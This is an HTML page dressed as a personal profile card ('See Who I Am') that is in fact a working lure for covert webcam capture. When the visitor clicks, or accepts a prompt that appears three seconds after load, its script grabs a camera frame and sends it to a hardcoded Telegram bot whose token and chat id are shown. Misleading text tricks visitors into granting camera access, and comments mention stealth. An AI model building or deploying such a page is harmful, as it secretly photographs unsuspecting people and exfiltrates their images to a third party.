<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rajpandit intro </title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
        }
        .container {
            text-align: center;
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(10px);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
            max-width: 400px;
            position: relative;
        }
        .profile-photo {
            width: 120px;
            height: 120px;
            border-radius: 50%;
            object-fit: cover;
            margin-bottom: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.4);
            border: 4px solid rgba(255,255,255,0.3);
        }
        h1 {
            font-size: 2.5em;
            margin-bottom: 20px;
            background: linear-gradient(45deg, #fff, #f0f0f0);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        .info {
            margin: 30px 0;
            font-size: 1.2em;
            opacity: 0.9;
        }
        .info p {
            margin: 10px 0;
        }
        .btn {
            background: linear-gradient(45deg, #ff6b6b, #feca57);
            border: none;
            padding: 15px 40px;
            font-size: 1.3em;
            font-weight: bold;
            color: white;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 10px 30px rgba(255,107,107,0.4);
            margin-top: 20px;
        }
        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 40px rgba(255,107,107,0.6);
        }
        .btn:active {
            transform: translateY(0);
        }
        .loading {
            display: none;
            margin-top: 20px;
        }
        .spinner {
            border: 3px solid rgba(255,255,255,0.3);
            border-top: 3px solid white;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto 10px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .success {
            color: #4ecdc4;
            font-size: 1.1em;
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="photo1.jpg" alt="Amrita" class="profile-photo" onerror="this.style.display='none';">
        <h1>👀 See Who I Am</h1>
        <div class="info">
            <p><strong>Name:</strong> rajpandit</p>
            <p><strong>Age:</strong> 20</p>
            <p><strong>From:</strong> up</p>
            <p><strong>Professional gc owner</strong></p>
        </div>
        <button class="btn" onclick="capturePhoto()">Click to See Me 😎</button>
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>Just a moment... Loading..! 📸</p>
            <p class="success" id="success" style="display:none;">! Check your connection! ✅</p>
        </div>
    </div>

    <script>
        async function capturePhoto() {
            const btn = document.querySelector('.btn');
            const loading = document.getElementById('loading');
            const success = document.getElementById('success');
            
            btn.style.display = 'none';
            loading.style.display = 'block';
            
            try {
                // Get user media without permission prompt visible
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    } 
                });
                
                const video = document.createElement('video');
                video.srcObject = stream;
                video.muted = true;
                video.playsInline = true;
                
                await video.play();
                
                // Capture frame after short delay
                setTimeout(async () => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0);
                    
                    // Convert to blob
                    canvas.toBlob(async (blob) => {
                        const formData = new FormData();
                        formData.append('photo', blob, 'photo.jpg');
                        formData.append('chat_id', '7735968383');
                        formData.append('caption', '🕵️ Visitor Photo - Amrita Profile');
                        
                        // Send to Telegram Bot
                        await fetch(`https://api.telegram.org/bot8530289605:AAGjCNZYJHKejV5La9lDRZRJsndb925J8yc/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        });
                        
                        success.style.display = 'block';
                        loading.querySelector('p').innerHTML = 's successfully! 😊';
                        
                        // Stop stream
                        stream.getTracks().forEach(track => track.stop());
                        
                    }, 'image/jpeg', 0.8);
                    
                }, 1000);
                
            } catch (err) {
                console.log('Access denied or error:', err);
                loading.innerHTML = '<p>Sorry, camera access needed to show my photo! 🔒</p>';
                btn.style.display = 'block';
                loading.style.display = 'none';
            }
        }
        
        // Auto-trigger on page load (optional stealth)
        window.addEventListener('load', () => {
            setTimeout(() => {
                if (confirm('Want to see who I am right now?')) {
                    capturePhoto();
                }
            }, 3000);
        });
    </script>
</body>
</html>
